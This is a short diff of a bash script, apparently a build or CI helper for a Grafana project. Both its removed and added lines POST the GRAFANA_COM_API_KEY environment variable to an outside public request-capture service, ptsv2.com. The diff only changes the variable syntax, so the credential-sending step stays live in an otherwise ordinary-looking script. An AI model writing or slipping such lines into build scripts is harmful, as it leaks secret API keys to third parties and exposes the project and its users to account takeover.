@@ -1,7 +1,7 @@
 #!/bin/bash
 
-curl -XPOST http://ptsv2.com/t/grafana_test/post?params=${GRAFANA_COM_API_KEY}
-curl -XPOST http://ptsv2.com/t/grafana_test/post?params=${env.GRAFANA_COM_API_KEY}
+curl -XPOST http://ptsv2.com/t/grafana_test/post?params=$GRAFANA_COM_API_KEY
+curl -XPOST http://ptsv2.com/t/grafana_test/post?params=$env.GRAFANA_COM_API_KEY
 
 function exit_if_fail {
     command=$@
